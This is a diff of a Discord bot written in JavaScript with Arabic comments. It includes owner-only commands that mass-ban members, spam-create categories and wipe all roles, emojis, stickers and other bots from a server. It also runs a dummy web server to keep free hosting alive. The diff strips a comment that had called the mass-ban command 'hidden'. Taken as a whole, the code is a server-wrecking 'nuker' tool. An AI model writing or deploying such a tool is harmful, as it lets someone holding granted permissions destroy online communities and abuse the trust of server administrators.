@@ -1,7 +1,6 @@
 const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
-const http = require('http'); // المكتبة السحرية عشان نضحك على ريندر
+const http = require('http');
 
-// 1️⃣ فتح سيرفر وهمي عشان Render يشوف بورت مفتوح ويرتاح نفسياً
 const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Bot is running successfully!');
@@ -12,7 +11,6 @@ server.listen(PORT, () => {
     console.log(`[Render Trick] Dummy server is listening on port ${PORT}`);
 });
 
-// 2️⃣ إعدادات البوت الأساسية وتفعيل الـ Intents
 const client = new Client({ 
     intents: [
         GatewayIntentBits.Guilds, 
@@ -23,31 +21,21 @@ const client = new Client({
     ] 
 });
 
-const PREFIX = '.'; // أمر النقطة
-const OWNER_ID = '1515394889855275281'; // 🔒 قفل الأمان الخاص بك أنت فقط
+const PREFIX = '.'; 
+const OWNER_ID = '1515394889855275281'; // 🔒 قفل الأمان الخاص بك
 
 client.on('ready', () => {
     console.log(`تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
 });
 
-// 🛡️ حماية تلقائية عند دخول السيرفر: طرد الحسابات الجديدة أقل من 3 أيام لمنع التوكنات
-client.on('guildMemberAdd', async (member) => {
-    const minAge = 3 * 24 * 60 * 60 * 1000; 
-    const accountAge = Date.now() - member.user.createdAt.getTime();
-    if (accountAge < minAge) {
-        try { await member.kick('حماية من الحسابات الوهمية'); } catch (err) {}
-    }
-});
-
-// 📩 قراءة الرسائل وتنفيذ الأوامر السرية
 client.on('messageCreate', async (message) => {
     if (!message.content.startsWith(PREFIX) || message.author.bot) return;
-    if (message.author.id !== OWNER_ID) return; // الحماية الصارمة من الغرباء
+    if (message.author.id !== OWNER_ID) return; 
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args[0].toLowerCase();
 
-    // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50
+    // 1️⃣ أمر التبنيد الجماعي: .banall 50
     if (command === 'banall') {
         const count = parseInt(args[1]);
         if (isNaN(count) || count <= 0) return;
@@ -58,7 +46,7 @@ client.on('messageCreate', async (message) => {
             for (const member of targets) {
                 try {
                     await member.ban({ reason: 'تنظيف الحسابات' });
-                    await new Promise(resolve => setTimeout(resolve, 20000)); // ديلاي 20 ثانية للأمان
+                    await new Promise(resolve => setTimeout(resolve, 20000)); 
                 } catch (err) {}
             }
         } catch (error) {}
@@ -104,7 +92,29 @@ client.on('messageCreate', async (message) => {
         } catch (error) {}
     }
 
-    // 5️⃣ أمر تصفير الرتب بالكامل من السيرفر: .nukeroles
+    // 🔥 [الأمر الجديد]: إنشاء فئات (Categories) متكررة بنفس الاسم
+    if (command === 'makecategories') {
+        const count = parseInt(args[1]); // العدد المطلوبة
+        const categoryName = args.slice(2).join(' '); // اسم الفئة
+
+        if (isNaN(count) || count <= 0 || !categoryName) return;
+        const finalCount = count > 50 ? 50 : count; // حد أمان لأقصى عدد
+
+        try { await message.delete(); } catch (err) {}
+        try {
+            for (let i = 0; i < finalCount; i++) {
+                try {
+                    await message.guild.channels.create({
+                        name: categoryName,
+                        type: ChannelType.GuildCategory // تحديد النوع كـ فئة وليس روم
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // ديلاي للأمان
+                } catch (err) {}
+            }
+        } catch (error) {}
+    }
+
+    // 5️⃣ أمر تصفير الرتب: .nukeroles
     if (command === 'nukeroles') {
         try { await message.delete(); } catch (err) {}
         try {
@@ -124,23 +134,7 @@ client.on('messageCreate', async (message) => {
         try { await message.channel.bulkDelete(amount > 100 ? 100 : amount, true); } catch (error) {}
     }
 
-    // 7️⃣ أمر صناعة الرتب الثابتة الأساسية: .makeroles
-    if (command === 'makeroles') {
-        try { await message.delete(); } catch (err) {}
-        const defaultRoles = [{ name: '👑 | Owner', color: '#ff0000' }, { name: '🛠️ | Admin', color: '#00ff00' }, { name: '🛡️ | Moderator', color: '#0000ff' }, { name: '👥 | Member', color: '#aaaaaa' }];
-        try { for (const roleData of defaultRoles) { await message.guild.roles.create({ name: roleData.name, color: roleData.color }); await new Promise(resolve => setTimeout(resolve, 1000)); } } catch (error) {}
-    }
-
-    // 8️⃣ أمر صناعة رتب مخصصة جماعية: .makerolescustom 10 admin Name
-    if (command === 'makerolescustom') {
-        const count = parseInt(args[1]); const type = args[2]?.toLowerCase(); const roleName = args.slice(3).join(' ');
-        if (isNaN(count) || count <= 0 || !type || !roleName) return;
-        try { await message.delete(); } catch (err) {}
-        let perms = type === 'admin' ? [PermissionsBitField.Flags.Administrator] : [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages];
-        try { for (let i = 0; i < (count > 50 ? 50 : count); i++) { await message.guild.roles.create({ name: roleName, permissions: perms }); await new Promise(resolve => setTimeout(resolve, 1000)); } } catch (error) {}
-    }
-
-    // 9️⃣ أمر حذف جميع الإيموجيات: .nukeemojis
+    // 7️⃣ أمر حذف جميع الإيموجيات: .nukeemojis
     if (command === 'nukeemojis') {
         try { await message.delete(); } catch (err) {}
         try {
@@ -151,7 +145,7 @@ client.on('messageCreate', async (message) => {
         } catch (error) {}
     }
 
-    // 🔟 أمر حذف جميع الستيكرات: .nukestickers
+    // 8️⃣ أمر حذف جميع الستيكرات: .nukestickers
     if (command === 'nukestickers') {
         try { await message.delete(); } catch (err) {}
         try {
@@ -162,17 +156,14 @@ client.on('messageCreate', async (message) => {
         } catch (error) {}
     }
 
-    // 1️⃣1️⃣ أمر طرد جميع البوتات الخارجية من السيرفر: .nukebots
+    // 9️⃣ أمر طرد جميع البوتات الخارجية: .nukebots
     if (command === 'nukebots') {
         try { await message.delete(); } catch (err) {}
         try {
             const members = await message.guild.members.fetch();
             const bots = members.filter(m => m.user.bot && m.user.id !== client.user.id);
             for (const [id, bot] of bots) {
-                try {
-                    await bot.kick('تصفير السيرفر من البوتات الخارجية');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                } catch (err) {}
+                try { await bot.kick('تصفير السيرفر'); await new Promise(resolve => setTimeout(resolve, 1000)); } catch (err) {}
             }
         } catch (error) {}
     }
